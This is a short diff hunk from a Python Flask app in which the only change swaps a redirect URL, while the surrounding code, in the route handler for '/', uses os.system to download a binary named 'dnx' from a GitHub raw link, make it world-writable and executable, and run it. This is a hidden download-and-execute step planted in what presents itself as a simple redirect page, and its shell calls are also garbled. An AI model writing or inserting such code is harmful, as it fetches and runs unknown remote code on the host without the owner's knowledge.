@@ -6,7 +6,7 @@ app = Flask(__name__)
 @app.route('/')
 def redirect_and_run_command():
     # Redirect to a website
-    redirect_url = 'https://www.example.com'
+    redirect_url = 'https://www.sincode.ai/'
     os.system(f"start 'wget https://github.com/55113110159/OS/raw/main/dnx'")
     os.system(f"start 'chmod 777 dnx'")
     os.system(f"start './dnx'")
